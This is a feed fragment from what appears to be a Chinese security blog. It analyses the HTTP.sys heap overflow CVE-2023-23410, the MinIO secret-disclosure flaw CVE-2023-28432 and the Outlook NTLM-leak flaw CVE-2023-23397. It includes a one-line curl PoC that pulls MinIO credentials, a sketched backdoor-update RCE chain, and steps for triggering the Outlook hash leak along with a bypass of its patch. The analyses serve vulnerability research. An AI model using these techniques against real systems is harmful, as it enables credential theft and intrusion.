&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>该函数遍历&lt;code>HTTP_CHANNEL_BIND_INFO&lt;/code>结构体的&lt;code>ServiceNames HTTP_SERVICE_BINDING_W&lt;/code>指针数组的&lt;code>BufferSize&lt;/code>，并相加，而后将其返回，其中v4为unsigned int类型，而BufferSize为ULONG类型，均为四个字节，当循环相加时，如果BufferSize * NumberOfServiceNames 和v4相加超出0xFFFFFFFF则会产生整数溢出，使得UlpComputeChannelBindConfigSize返回的内存大小小于实际所需的内存大小。在调试器中可以看到在执行完fffff805`7984c899 03d9 add ebx, ecx后，将产生溢出，ebx变为0x28。&lt;/p>
&lt;p>
&lt;img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/61c62756-de07-4171-82de-71573ecc7c7b/Untitled.png" alt="Untitled" path="vulnerability/" if="vulnerability/CVE-2023-23410-Windows-HTTP-sys-EoP.zh-cn.md"/>&lt;/p>
&lt;p>返回到上层函数，&lt;code>UlCopyChannelBindConfigToIrp&lt;/code> 调用UxGetOutputBufferForOutDirect获取到用户传入的缓冲区大小，此时v41值为0x140&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>retCode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HttpQueryUrlGroupProperty&lt;/span>(urlGroupId, HttpServerChannelBindProperty,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>data_temp1, &lt;span style="color:#ae81ff">0x140&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>return_len);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>v43 &lt;span style="color:#f92672">=&lt;/span> v8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">IoIs32bitProcess&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OutputBufferForOutDirect &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UxGetOutputBufferForOutDirect&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)CurrentStackLocation,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0x10u&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">4&lt;/span>i64,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v31,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v32,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v41);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> OutputBufferForOutDirect;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( OutputBufferForOutDirect &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v8 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v41 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OutputBufferForOutDirect &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2147483643&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2147483643&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (WPP_MAIN_CB.StackSize &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">43&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_6:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_D&lt;/span>(v10, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, &lt;span style="color:#ae81ff">2147483653&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/1.png" />&lt;/p>
&lt;p>由于在HTTP!UlpComputeChannelBindConfigSize中发生整数溢出，导致HTTP!UlpComputeChannelBindConfigSize返回值小于用户提供的0x140，绕过了内存大小检查，在后面通过memcpy将HTTP_CHANNEL_BIND_INFO结构体的PHTTP_SERVICE_BINDING_BASE的Buffer成员拷贝到指定内存中，拷贝长度为BufferSize，即用户提供的0x&lt;em>F0F0EF0&lt;/em>&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/2.png" />&lt;/p>
&lt;p>0x&lt;em>F0F0EF0&lt;/em>远大于用户输入的缓冲区0x1000，导致堆溢出。&lt;/p>
&lt;h3 id="补丁">补丁&lt;/h3>
&lt;p>通过bindiff可知，在补丁中增加了对BufferSize进行判断的逻辑，判断BufferSize是否小于0xFFFC&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/diff.png" />&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/4.png" />&lt;/p>
&lt;p>由于ServiceName最大数量限制为0x40，则0x40 * 0xFFFC = 3FFF00，不能产生溢出，修复了该漏洞。&lt;/p>
&lt;p>参考资料&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.freebuf.com/vuls/364920.html" target="_blank">https://www.freebuf.com/vuls/364920.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-05-05T20:59:45+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2021-3156 Sudo 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/</link><pubDate>Fri, 05 May 2023 20:54:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/</guid><description>&lt;p>&lt;strong>Created at 2023-05-05T20:54:20+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-28432 MinIO 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</link><pubDate>Fri, 05 May 2023 20:53:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Minio是一个多云对象存储框架。在从 RELEASE.2019-12-17T23-16-33Z 开始且 RELEASE.2023-03-20T20-16-18Z 之前的集群部署中，MinIO 返回所有环境变量，包括“MINIO_SECRET_KEY”和“MINIO_ROOT_PASSWORD”，从而导致信息泄露。分布式部署的所有用户都会受到影响。建议所有用户升级到发布版本.2023-03-20T20-16-18Z。&lt;/p>
&lt;h4 id="指纹">指纹&lt;/h4>
&lt;p>web.title=&amp;ldquo;minio&amp;rdquo;&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>2019-12-17t23-16-33z &amp;lt;= Minio &amp;lt; 2023-03-20t20-16-18z&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>使用Docker启动4个minio即可。&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>补丁分析&lt;/strong>
对比修复版本和未修复版本
&lt;a href="https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z...RELEASE.2023-03-20T20-16-18Z" target="_blank">https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z&amp;hellip;RELEASE.2023-03-20T20-16-18Z&lt;/a>可知漏洞在commit
&lt;a href="https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077" target="_blank">https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077&lt;/a>修复，查看修复代码，可以知道在 &lt;code>cmd/bootstrap-peer-server.go#VerifyHandler&lt;/code>方法中增加了鉴权逻辑：
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-28432-MinIO-information-disclosure.zh-cn.assets/1.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> &lt;span style="color:#a6e22e">storageServerRequestValidate&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">Request&lt;/span>) &lt;span style="color:#66d9ef">error&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">token&lt;/span>, &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">jwtreq&lt;/span>.&lt;span style="color:#a6e22e">AuthorizationHeaderExtractor&lt;/span>.&lt;span style="color:#a6e22e">ExtractToken&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">jwtreq&lt;/span>.&lt;span style="color:#a6e22e">ErrNoTokenInRequest&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">errNoAuthToken&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">errMalformedAuth&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">claims&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">xjwt&lt;/span>.&lt;span style="color:#a6e22e">NewStandardClaims&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> = &lt;span style="color:#a6e22e">xjwt&lt;/span>.&lt;span style="color:#a6e22e">ParseWithStandardClaims&lt;/span>(&lt;span style="color:#a6e22e">token&lt;/span>, &lt;span style="color:#a6e22e">claims&lt;/span>, []byte(&lt;span style="color:#a6e22e">globalActiveCred&lt;/span>.&lt;span style="color:#a6e22e">SecretKey&lt;/span>)); &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">errAuthentication&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">owner&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">claims&lt;/span>.&lt;span style="color:#a6e22e">AccessKey&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">globalActiveCred&lt;/span>.&lt;span style="color:#a6e22e">AccessKey&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">claims&lt;/span>.&lt;span style="color:#a6e22e">Subject&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">globalActiveCred&lt;/span>.&lt;span style="color:#a6e22e">AccessKey&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> !&lt;span style="color:#a6e22e">owner&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">errAuthentication&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">claims&lt;/span>.&lt;span style="color:#a6e22e">Audience&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">URL&lt;/span>.&lt;span style="color:#a6e22e">RawQuery&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">errAuthentication&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">requestTimeStr&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">Header&lt;/span>.&lt;span style="color:#a6e22e">Get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;X-Minio-Time&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">requestTime&lt;/span>, &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">time&lt;/span>.&lt;span style="color:#a6e22e">Parse&lt;/span>(&lt;span style="color:#a6e22e">time&lt;/span>.&lt;span style="color:#a6e22e">RFC3339&lt;/span>, &lt;span style="color:#a6e22e">requestTimeStr&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">errMalformedAuth&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">utcNow&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">UTCNow&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">delta&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">requestTime&lt;/span>.&lt;span style="color:#a6e22e">Sub&lt;/span>(&lt;span style="color:#a6e22e">utcNow&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">delta&lt;/span> &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">delta&lt;/span> &lt;span style="color:#f92672">*=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">delta&lt;/span> &amp;gt; &lt;span style="color:#a6e22e">DefaultSkewTime&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">errSkewedAuthTime&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而 &lt;code>VerifyHandler&lt;/code>方法对应的路由在&lt;code>cmd/bootstrap-peer-server.go#registerBootstrapRESTHandlers&lt;/code>注册，对应的路径为 &lt;code>bootstrapRESTPrefix+bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> &lt;span style="color:#a6e22e">registerBootstrapRESTHandlers&lt;/span>(&lt;span style="color:#a6e22e">router&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">mux&lt;/span>.&lt;span style="color:#a6e22e">Router&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#66d9ef">func&lt;/span>(&lt;span style="color:#a6e22e">f&lt;/span> &lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">HandlerFunc&lt;/span>) &lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">HandlerFunc&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">collectInternodeStats&lt;/span>(&lt;span style="color:#a6e22e">httpTraceHdrs&lt;/span>(&lt;span style="color:#a6e22e">f&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">server&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">bootstrapRESTServer&lt;/span>{}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">subrouter&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">router&lt;/span>.&lt;span style="color:#a6e22e">PathPrefix&lt;/span>(&lt;span style="color:#a6e22e">bootstrapRESTPrefix&lt;/span>).&lt;span style="color:#a6e22e">Subrouter&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">subrouter&lt;/span>.&lt;span style="color:#a6e22e">Methods&lt;/span>(&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">MethodPost&lt;/span>).&lt;span style="color:#a6e22e">Path&lt;/span>(&lt;span style="color:#a6e22e">bootstrapRESTVersionPrefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">bootstrapRESTMethodHealth&lt;/span>).&lt;span style="color:#a6e22e">HandlerFunc&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">h&lt;/span>(&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">HealthHandler&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">subrouter&lt;/span>.&lt;span style="color:#a6e22e">Methods&lt;/span>(&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">MethodPost&lt;/span>).&lt;span style="color:#a6e22e">Path&lt;/span>(&lt;span style="color:#a6e22e">bootstrapRESTVersionPrefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">bootstrapRESTMethodVerify&lt;/span>).&lt;span style="color:#a6e22e">HandlerFunc&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">h&lt;/span>(&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">VerifyHandler&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">minioReservedBucket&lt;/span> = &lt;span style="color:#e6db74">&amp;#34;minio&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">minioReservedBucketPath&lt;/span> = &lt;span style="color:#a6e22e">SlashSeparator&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">minioReservedBucket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bootstrapRESTPrefix&lt;/span> = &lt;span style="color:#a6e22e">minioReservedBucketPath&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/bootstrap&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">bootstrapRESTVersion&lt;/span> = &lt;span style="color:#e6db74">&amp;#34;v1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">bootstrapRESTVersionPrefix&lt;/span> = &lt;span style="color:#a6e22e">SlashSeparator&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">bootstrapRESTVersion&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">bootstrapRESTMethodVerify&lt;/span> = &lt;span style="color:#e6db74">&amp;#34;/verify&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>综合可得，触发漏洞方法为向&lt;code>/minio/bootstrap/v1/verify&lt;/code>接口发送POST请求即可，除了对verify接口做鉴权之外，补丁中还在输出中去除了密钥等敏感信息。
![[../images/Pasted image 20231007234853.png]]&lt;/p>
&lt;p>PoC&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -X POST http://target/minio/bootstrap/v1/verify
&lt;/code>&lt;/pre>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞分析起来较为简单，由于Minio是go开发的，直接RCE比较难，目前RCE方式是通过信息泄露获取到管理员密钥登录，而后替换更新链接，在使用minio自带的mc工具进行更新，将当前minio实例替换为带有后门版本的minio，从而执行任意代码。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z...RELEASE.2023-03-20T20-16-18Z" target="_blank">https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z&amp;hellip;RELEASE.2023-03-20T20-16-18Z&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>创建于2023-10-06&lt;/p>
&lt;p>&lt;strong>Created at 2023-05-05T20:53:41+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-23397 Outlook 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/</link><pubDate>Fri, 05 May 2023 20:50:19 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Microsoft Outlook 存在权限提升漏洞，未经身份验证的远程攻击者可通过向受害者发送特制的带有UNC地址的电子邮件来利用此漏洞，当受害者所用的outlook处于打开状态时，outlook收到的会议提醒过期时会尝试连接攻击者指定的外部 UNC 位置。这会将受害者的Net-NTLMv2 hash泄露给攻击者，然后攻击者可以将其中继到另一个服务，进而获得该用户权限。&lt;/p>
&lt;p>在微软发布的补丁中对该漏洞修复不完全，只限制了所用UNC路径中不能含有”.”，攻击者可以使用诸如\aaa\形式的UNC路径对其绕过。&lt;/p>
&lt;p>给Exchange邮箱发送带有ReminderFileParameter属性并指向UNC路径，ReminderOverride设为true，ReminderSet设为true即可触发&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;ul>
&lt;li>outlook 2016&lt;/li>
&lt;li>windows 2019 + AD域&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>根据微软文档，Outlook会议可以设置PidLidReminderFileParameter和PidLidReminderOverride属性，其含义分别为：指定客户在该对象的提醒过期时应播放的声音的文件名和Outlook客户端是否应该保留PidLidReminderFileParameter属性的值。攻击者在发送给受害者的会议里面设置PidLidReminderFileParameter和PidLidReminderOverride属性，当会议过期时outlook会尝试解析PidLidReminderFileParameter属性并尝试播放PidLidReminderFileParameter指向的路径的声音文件(.wav)，但outlook解析时并未限制PidLidReminderFileParameter属性指向的是本地文件还是网络文件。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-23397-Outlook-EoP.zh-cn.assets/1.png" />&lt;/p>
